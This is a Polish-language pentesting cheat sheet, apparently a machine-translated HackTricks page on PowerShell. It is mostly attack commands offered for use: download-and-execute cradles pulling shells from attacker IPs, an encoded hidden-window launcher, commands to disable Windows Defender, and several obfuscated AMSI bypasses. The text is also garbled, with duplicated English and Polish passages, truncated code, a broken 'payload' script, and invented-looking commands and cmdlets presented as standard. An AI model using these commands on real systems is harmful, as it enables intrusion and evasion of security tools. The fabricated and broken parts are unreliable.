# Podstawy PowerShell dla pentester√≥w

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w github.

</details>

## Domy≈õlne lokalizacje PowerShell
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## Podstawowe polecenia PS do rozpoczƒôcia

Here are some basic PowerShell commands that can help you get started:

Oto kilka podstawowych polece≈Ñ PowerShell, kt√≥re mogƒÖ pom√≥c Ci rozpoczƒÖƒá:

### Get-Command

Use the `Get-Command` command to retrieve a list of available commands in PowerShell.

U≈ºyj polecenia `Get-Command`, aby wy≈õwietliƒá listƒô dostƒôpnych polece≈Ñ w PowerShell.

```powershell
Get-Command
```

### Get-Help

If you need help with a specific command, use the `Get-Help` command followed by the command name.

Je≈õli potrzebujesz pomocy dotyczƒÖcej konkretnego polecenia, u≈ºyj polecenia `Get-Help`, a nastƒôpnie podaj nazwƒô polecenia.

```powershell
Get-Help <command_name>
```

### Get-Process

To retrieve a list of running processes, use the `Get-Process` command.

Aby wy≈õwietliƒá listƒô uruchomionych proces√≥w, u≈ºyj polecenia `Get-Process`.

```powershell
Get-Process
```

### Get-Service

To retrieve a list of installed services, use the `Get-Service` command.

Aby wy≈õwietliƒá listƒô zainstalowanych us≈Çug, u≈ºyj polecenia `Get-Service`.

```powershell
Get-Service
```

### Get-EventLog

To retrieve event logs, use the `Get-EventLog` command followed by the log name.

Aby wy≈õwietliƒá dzienniki zdarze≈Ñ, u≈ºyj polecenia `Get-EventLog`, a nastƒôpnie podaj nazwƒô dziennika.

```powershell
Get-EventLog -LogName <log_name>
```

### Get-WmiObject

To retrieve information from WMI (Windows Management Instrumentation), use the `Get-WmiObject` command followed by the WMI class name.

Aby uzyskaƒá informacje z WMI (Windows Management Instrumentation), u≈ºyj polecenia `Get-WmiObject`, a nastƒôpnie podaj nazwƒô klasy WMI.

```powershell
Get-WmiObject -Class <class_name>
```

### Get-ChildItem

To list files and directories in a specific location, use the `Get-ChildItem` command followed by the path.

Aby wy≈õwietliƒá pliki i katalogi w okre≈õlonym miejscu, u≈ºyj polecenia `Get-ChildItem`, a nastƒôpnie podaj ≈õcie≈ºkƒô.

```powershell
Get-ChildItem -Path <path>
```

These are just a few examples of basic PowerShell commands. As you explore more, you will discover a wide range of powerful capabilities that PowerShell offers.

To tylko kilka przyk≈Çad√≥w podstawowych polece≈Ñ PowerShell. W miarƒô eksploracji odkryjesz szeroki zakres potƒô≈ºnych mo≈ºliwo≈õci, kt√≥re oferuje PowerShell.
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## Pobierz i Uruchom

To jest prosty skrypt PowerShell, kt√≥ry mo≈ºna u≈ºyƒá do pobrania i uruchomienia pliku z internetu. Skrypt ten jest przydatny w przypadku, gdy chcesz zdalnie pobraƒá i uruchomiƒá plik na komputerze docelowym.

```powershell
$Url = "https://example.com/file.exe"
$Output = "C:\Temp\file.exe"

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($Url, $Output)

Start-Process -FilePath $Output
```

Aby u≈ºyƒá tego skryptu, wystarczy zmieniƒá warto≈õci zmiennych `$Url` i `$Output` na odpowiednie warto≈õci. `$Url` powinien zawieraƒá pe≈Çny adres URL pliku, kt√≥ry chcesz pobraƒá, a `$Output` powinien zawieraƒá ≈õcie≈ºkƒô docelowƒÖ, gdzie chcesz zapisaƒá pobrany plik.

Po uruchomieniu skryptu, plik zostanie pobrany z podanego adresu URL i zapisany w okre≈õlonym miejscu. Nastƒôpnie skrypt uruchomi ten plik na komputerze docelowym.

Pamiƒôtaj, ≈ºe ten skrypt mo≈ºe byƒá u≈ºywany w celach legalnych, takich jak testowanie bezpiecze≈Ñstwa lub zarzƒÖdzanie zdalnymi komputerami. U≈ºywanie go w nielegalny spos√≥b jest niezgodne z prawem i mo≈ºe prowadziƒá do konsekwencji prawnych.
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### Pobierz i wykonaj w tle z pominiƒôciem AMSI

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# Pobierz plik
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $Output)

# Wykonaj plik w tle z pominiƒôciem AMSI
$Bytes = [System.IO.File]::ReadAllBytes($Output)
$EncodedCommand = [System.Convert]::ToBase64String($Bytes)
$Command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedCommand))
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
powershell -exec bypass -enc $EncodedCommand
```

Ten skrypt PowerShell pobiera plik wykonywalny z podanego adresu URL i nastƒôpnie wykonuje go w tle, pomijajƒÖc skanowanie AMSI.

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# Download the file
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $Output)

# Execute the file in the background with AMSI bypass
$Bytes = [System.IO.File]::ReadAllBytes($Output)
$EncodedCommand = [System.Convert]::ToBase64String($Bytes)
$Command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedCommand))
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
powershell -exec bypass -enc $EncodedCommand
```

This PowerShell script downloads an executable file from the specified URL and then executes it in the background, bypassing AMSI scanning.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### U≈ºywanie b64 w systemie Linux

The `b64` command in Linux is used to encode or decode data in Base64 format. It is a useful tool for manipulating and transferring data in a text-based format. Here are some examples of how to use the `b64` command:

#### Encoding data

To encode data using Base64, you can use the following command:

```
$ echo "Hello, World!" | b64
```

This will output the encoded data:

```
SGVsbG8sIFdvcmxkIQ==
```

#### Decoding data

To decode Base64-encoded data, you can use the following command:

```
$ echo "SGVsbG8sIFdvcmxkIQ==" | b64 -d
```

This will output the decoded data:

```
Hello, World!
```

#### Encoding a file

You can also encode the contents of a file using Base64. For example, to encode the contents of a file named `file.txt`, you can use the following command:

```
$ b64 file.txt
```

This will output the encoded data to the console.

#### Decoding a file

Similarly, you can decode the contents of a Base64-encoded file. For example, to decode the contents of a file named `encoded.txt`, you can use the following command:

```
$ b64 -d encoded.txt
```

This will output the decoded data to the console.

The `b64` command is a handy tool for working with Base64-encoded data in Linux. It can be used in various scenarios, such as encoding or decoding data, or working with files.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## Pobierz

### System.Net.WebClient

Aby pobraƒá plik za pomocƒÖ klasy `System.Net.WebClient`, wykonaj nastƒôpujƒÖcy kod:

```powershell
$webClient = New-Object System.Net.WebClient
$url = "adres_url_pliku"
$destination = "≈õcie≈ºka_docelowa"
$webClient.DownloadFile($url, $destination)
```

Gdzie:
- `adres_url_pliku` to adres URL pliku, kt√≥ry chcesz pobraƒá.
- `≈õcie≈ºka_docelowa` to ≈õcie≈ºka, w kt√≥rej chcesz zapisaƒá pobrany plik.

Przyk≈Çad u≈ºycia:

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://www.example.com/plik.txt"
$destination = "C:\Users\U≈ºytkownik\Documents\plik.txt"
$webClient.DownloadFile($url, $destination)
```

Ten kod pobierze plik `plik.txt` ze strony `https://www.example.com` i zapisze go w lokalizacji `C:\Users\U≈ºytkownik\Documents\plik.txt`.
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

Invoke-WebRequest is a cmdlet in PowerShell that allows you to send HTTP and HTTPS requests to a web page or web service. It can be used for various purposes, such as downloading files, interacting with web APIs, and scraping web content.

To use Invoke-WebRequest, you need to provide the URL of the web page or web service you want to interact with. You can also specify additional parameters, such as headers, cookies, and authentication credentials.

Here is an example of how to use Invoke-WebRequest to download a file from a web server:

```powershell
Invoke-WebRequest -Uri "https://example.com/file.txt" -OutFile "C:\path\to\save\file.txt"
```

In this example, the `-Uri` parameter specifies the URL of the file you want to download, and the `-OutFile` parameter specifies the path where you want to save the downloaded file.

You can also use Invoke-WebRequest to interact with web APIs by sending HTTP requests with specific headers and parameters. For example, you can send a POST request with JSON data to a web API:

```powershell
$headers = @{
    "Content-Type" = "application/json"
}

$body = @{
    "name" = "John Doe"
    "email" = "johndoe@example.com"
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://api.example.com/users" -Method Post -Headers $headers -Body $body
```

In this example, the `-Method` parameter specifies the HTTP method (POST in this case), the `-Headers` parameter specifies the request headers, and the `-Body` parameter specifies the request body.

Invoke-WebRequest is a powerful cmdlet that can be used for various web-related tasks in PowerShell. It provides a convenient way to interact with web pages, web services, and web APIs.
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget to narzƒôdzie wiersza polece≈Ñ, kt√≥re umo≈ºliwia pobieranie plik√≥w z sieci. Mo≈ºe byƒá u≈ºywane do pobierania plik√≥w z serwer√≥w HTTP, HTTPS i FTP. Wget jest czƒôsto u≈ºywany przez pentester√≥w do pobierania plik√≥w z celu przeprowadzenia analizy i test√≥w penetracyjnych.

#### Sk≈Çadnia

```
wget [opcje] [adres URL]
```

#### Przyk≈Çady u≈ºycia

Pobierz plik z serwera HTTP:

```
wget http://example.com/plik.txt
```

Pobierz plik z serwera HTTPS:

```
wget https://example.com/plik.txt
```

Pobierz plik z serwera FTP:

```
wget ftp://example.com/plik.txt
```

#### Opcje

- `-O <nazwa_pliku>`: Okre≈õla nazwƒô, pod jakƒÖ zostanie zapisany pobrany plik.
- `-P <≈õcie≈ºka>`: Okre≈õla ≈õcie≈ºkƒô, do kt√≥rej zostanie zapisany pobrany plik.
- `-r`: Rekursywnie pobiera wszystkie pliki z podkatalog√≥w.
- `-np`: Nie przechodzi do katalog√≥w nadrzƒôdnych podczas rekursywnego pobierania.
- `-nc`: Nie pobiera pliku, je≈õli ju≈º istnieje.
- `-nv`: Wy≈ÇƒÖcza wy≈õwietlanie komunikat√≥w o postƒôpie pobierania.
- `-q`: Wy≈ÇƒÖcza wy≈õwietlanie jakichkolwiek komunikat√≥w.
- `-U <nazwa_agenta>`: Okre≈õla nazwƒô agenta u≈ºytkownika, kt√≥ra zostanie wys≈Çana do serwera podczas pobierania.

Wiƒôcej informacji na temat dostƒôpnych opcji mo≈ºna znale≈∫ƒá w dokumentacji Wget.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer to us≈Çuga w systemie Windows, kt√≥ra umo≈ºliwia przesy≈Çanie plik√≥w miƒôdzy komputerami za pomocƒÖ protoko≈Çu HTTP lub HTTPS. Jest to przydatne narzƒôdzie dla pentester√≥w, kt√≥rzy chcƒÖ przenosiƒá pliki w trakcie test√≥w penetracyjnych.

Aby rozpoczƒÖƒá transfer pliku za pomocƒÖ BitsTransfer, mo≈ºna u≈ºyƒá polecenia `Start-BitsTransfer`. Polecenie to wymaga podania ≈∫r√≥d≈Çowego i docelowego adresu URL, a tak≈ºe lokalizacji, w kt√≥rej ma zostaƒá zapisany plik.

Przyk≈Çad u≈ºycia polecenia `Start-BitsTransfer`:

```powershell
Start-BitsTransfer -Source "http://example.com/file.txt" -Destination "C:\Temp\file.txt"
```

Polecenie to rozpocznie transfer pliku `file.txt` z adresu URL `http://example.com/file.txt` i zapisze go w lokalizacji `C:\Temp\file.txt` na komputerze docelowym.

BitsTransfer oferuje r√≥wnie≈º inne przydatne funkcje, takie jak wznawianie przerwanych transfer√≥w, monitorowanie postƒôpu transferu i zarzƒÖdzanie transferami w tle.

Aby uzyskaƒá wiƒôcej informacji na temat BitsTransfer i dostƒôpnych polece≈Ñ, mo≈ºna u≈ºyƒá polecenia `Get-Help Start-BitsTransfer` w konsoli PowerShell.
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

W systemie Kali Linux mo≈ºemy u≈ºywaƒá polecenia `base64` do kodowania i dekodowania danych w formacie Base64. Mo≈ºe to byƒá przydatne podczas pentestowania, gdy chcemy ukryƒá nasze polecenia przed wykryciem.

Aby zakodowaƒá dane za pomocƒÖ Base64 w Kali Linux, mo≈ºemy u≈ºyƒá nastƒôpujƒÖcego polecenia:

```bash
echo -n "Dane do zakodowania" | base64
```

Aby zdekodowaƒá dane zakodowane w formacie Base64, mo≈ºemy u≈ºyƒá polecenia:

```bash
echo -n "Dane do zdekodowania" | base64 -d
```

W przypadku pentestowania system√≥w Windows mo≈ºemy u≈ºyƒá parametru `-EncodedCommand` w PowerShell do uruchamiania polece≈Ñ zaszyfrowanych w formacie Base64. Mo≈ºe to pom√≥c w unikniƒôciu wykrycia przez systemy antywirusowe.

Aby uruchomiƒá zaszyfrowane polecenie w PowerShell, mo≈ºemy u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```powershell
powershell.exe -EncodedCommand "Zaszyfrowane polecenie w formacie Base64"
```

Pamiƒôtaj, ≈ºe polecenie musi byƒá zakodowane w formacie Base64 przed u≈ºyciem parametru `-EncodedCommand`.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [Polityka wykonywania](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [Ograniczony jƒôzyk](broken-reference/)

## [Polityka AppLocker](broken-reference/)

## W≈ÇƒÖcz WinRM (Zdalne PS)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Wy≈ÇƒÖczanie Defendera

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### Bypass AMSI

**`amsi.dll`** jest **≈Çadowany** do twojego procesu i ma niezbƒôdne **eksporty**, aby ka≈ºda aplikacja z nim wsp√≥≈Çpracowaƒá. Poniewa≈º jest ≈Çadowany do przestrzeni pamiƒôci procesu, kt√≥ry **kontrolujesz**, mo≈ºesz zmieniƒá jego zachowanie przez **nadpisanie instrukcji w pamiƒôci**. Sprawia to, ≈ºe nie wykrywa niczego.

Dlatego celem bypass√≥w AMSI jest **nadpisanie instrukcji tej DLL w pamiƒôci, aby wykrywanie by≈Ço bezu≈ºyteczne**.

Strona internetowa generujƒÖca bypassy AMSI: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSI Bypass 2 - Podpinanie wywo≈Ça≈Ñ zarzƒÖdzanych API

Sprawd≈∫ [**ten post, aby uzyskaƒá szczeg√≥≈Çowe informacje i kod**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/). Wprowadzenie:

Ta nowa technika polega na podpinaniu wywo≈Ça≈Ñ API metod .NET. Okazuje siƒô, ≈ºe metody .NET muszƒÖ zostaƒá skompilowane do instrukcji maszynowych w pamiƒôci, kt√≥re wyglƒÖdajƒÖ bardzo podobnie do metod natywnych. Te skompilowane metody mogƒÖ byƒá podpinane, aby zmieniƒá przep≈Çyw sterowania programu.

Kroki wykonywania podpinania wywo≈Ça≈Ñ API metod .NET to:

1. Zidentyfikuj docelowƒÖ metodƒô do podpiƒôcia
2. Zdefiniuj metodƒô o takim samym prototypie funkcji jak docelowa
3. U≈ºyj refleksji, aby znale≈∫ƒá metody
4. Upewnij siƒô, ≈ºe ka≈ºda metoda zosta≈Ça skompilowana
5. Znajd≈∫ lokalizacjƒô ka≈ºdej metody w pamiƒôci
6. Nadpisz docelowƒÖ metodƒô instrukcjami wskazujƒÖcymi na naszƒÖ z≈Ço≈õliwƒÖ metodƒô

### AMSI Bypass 3 - Uprawnienia SeDebug

[Za pomocƒÖ tego przewodnika i kodu](https://github.com/MzHmO/DebugAmsi) mo≈ºesz zobaczyƒá, jak przy wystarczajƒÖcych uprawnieniach do debugowania proces√≥w mo≈ºna uruchomiƒá proces powershell.exe, go debugowaƒá, monitorowaƒá, kiedy ≈Çadowana jest biblioteka `amsi.dll` i jƒÖ wy≈ÇƒÖczyƒá.

### AMSI Bypass - Wiƒôcej zasob√≥w

+ [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+ [Amsi Bypass na Windows 11 w 2023 roku](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6)  [Github](https://github.com/senzee1984/Amsi_Bypass_In_2023)

## Historia PS
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## Znajd≈∫ nowsze pliki

Opcje: `CreationTime`, `CreationTimeUtc`, `LastAccessTime`, `LastAccessTimeUtc`, `LastWriteTime`, `LastWriteTimeUtc`
```powershell
# LastAccessTime:
(gci C:\ -r | sort -Descending LastAccessTime | select -first 100) | Select-Object -Property LastAccessTime,FullName

# LastWriteTime:
(gci C:\ -r | sort -Descending LastWriteTime | select -first 100) | Select-Object -Property LastWriteTime,FullName
```
## Uzyskaj uprawnienia

Aby uzyskaƒá informacje na temat uprawnie≈Ñ u≈ºytkownik√≥w w systemie Windows, mo≈ºna u≈ºyƒá nastƒôpujƒÖcych polece≈Ñ PowerShell:

### Polecenie Get-ACL

Polecenie `Get-ACL` pozwala na pobranie listy uprawnie≈Ñ dla okre≈õlonego obiektu, takiego jak plik, folder lub rejestr. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ACL -Path C:\Folder
```

### Polecenie Get-Acl | Format-List

Polecenie `Get-ACL` mo≈ºna po≈ÇƒÖczyƒá z poleceniem `Format-List`, aby uzyskaƒá bardziej szczeg√≥≈Çowe informacje na temat uprawnie≈Ñ. Przyk≈Çad u≈ºycia:

```powershell
Get-ACL -Path C:\Folder | Format-List
```

### Polecenie Get-NTFSAccess

Polecenie `Get-NTFSAccess` pozwala na pobranie uprawnie≈Ñ NTFS dla okre≈õlonego obiektu. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-NTFSAccess -Path C:\Folder
```

### Polecenie Get-EffectiveAccess

Polecenie `Get-EffectiveAccess` pozwala na sprawdzenie efektywnych uprawnie≈Ñ dla okre≈õlonego u≈ºytkownika w systemie Windows. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-EffectiveAccess -Identity DOMAIN\Username -Path C:\Folder
```

### Polecenie Get-ProcessTokenPrivilege

Polecenie `Get-ProcessTokenPrivilege` pozwala na pobranie informacji o uprawnieniach tokena procesu. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ProcessTokenPrivilege -ProcessId 1234
```

### Polecenie Get-ServicePermission

Polecenie `Get-ServicePermission` pozwala na pobranie uprawnie≈Ñ dla okre≈õlonej us≈Çugi systemowej. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ServicePermission -ServiceName ServiceName
```

### Polecenie Get-RegistryKeyPermission

Polecenie `Get-RegistryKeyPermission` pozwala na pobranie uprawnie≈Ñ dla okre≈õlonego klucza rejestru. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-RegistryKeyPermission -KeyPath HKLM:\Software\Microsoft
```

### Polecenie Get-SharePermission

Polecenie `Get-SharePermission` pozwala na pobranie uprawnie≈Ñ dla okre≈õlonego udzia≈Çu sieciowego. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-SharePermission -Name ShareName
```

### Polecenie Get-ADUser

Polecenie `Get-ADUser` pozwala na pobranie informacji o u≈ºytkownikach z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADUser -Identity Username
```

### Polecenie Get-ADGroup

Polecenie `Get-ADGroup` pozwala na pobranie informacji o grupach z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADGroup -Identity GroupName
```

### Polecenie Get-ADComputer

Polecenie `Get-ADComputer` pozwala na pobranie informacji o komputerach z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADComputer -Identity ComputerName
```

### Polecenie Get-ADObject

